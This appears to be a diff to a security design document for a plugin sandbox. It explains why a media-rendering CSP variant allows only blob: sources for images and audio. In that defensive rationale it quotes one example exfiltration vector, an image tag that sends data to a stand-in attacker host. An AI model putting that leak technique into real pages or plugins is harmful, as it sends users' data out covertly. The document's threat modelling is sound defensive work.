@@ -100,6 +100,30 @@ we already intended to enforce; both are closed.
   timeout so a plugin that imports but never returns a manifest can't keep a live,
   capable sandbox attached indefinitely. (`core/loader.js`, `core/plugin-broker.js`.)
 
+## Media sandbox — a narrowly-widened CSP for qualitative coding (#139)
+
+Qualitative coding of audio/image/video must **render** media inside the coding
+workspace, but the strict plugin CSP (`default-src 'none'`) blocks every `<audio>`/
+`<video>`/`<img>` source. A dedicated sandbox variant (`plugin-host-media.html`,
+selected only for plugins that declare `manifest.media === true`, exactly like the
+codec host is selected by `manifest.codecs`) widens the CSP by **two directives
+only**: `media-src blob:` and `img-src blob:`.
+
+- **`blob:` only — never `https:`/`data:` in those directives.** `<img src="https://
+  attacker/?leak=…">` is a covert-GET exfiltration channel; allowing a remote scheme
+  here would undo the `connect-src 'none'` "a plugin can't phone home" guarantee. Blob
+  is same-origin-opaque and unreadable off-device, so it grants *display*, not *reach*.
+- **The plugin never fetches, and never touches the store.** It calls
+  `app.media.load(ref)`; the host reads the bytes from the content-addressed media
+  store (`core/media-store.js`) and posts back a `Blob`; the plugin turns that into a
+  blob: URL *inside its own realm*. Refs resolve **locally only** — `asset:<hash>`
+  (the store) or `data:` (inline) — and any other scheme is rejected, so a ref cannot
+  reach the network (the remote-URL fetcher is deliberately deferred, #143/B).
+- **No new data exposure.** `media.load` returns the user's own local media bytes to
+  an already-activated plugin (which is already trusted with the active dataset); with
+  egress still closed, this is not a new exfiltration surface. Everything that bounds
+  *reach* — `connect-src 'none'`, opaque origin, the broker allowlist — is unchanged.
+
 ## Accepted residual risks (won't fix)
 
 These are real gaps we have consciously chosen **not** to close, because the
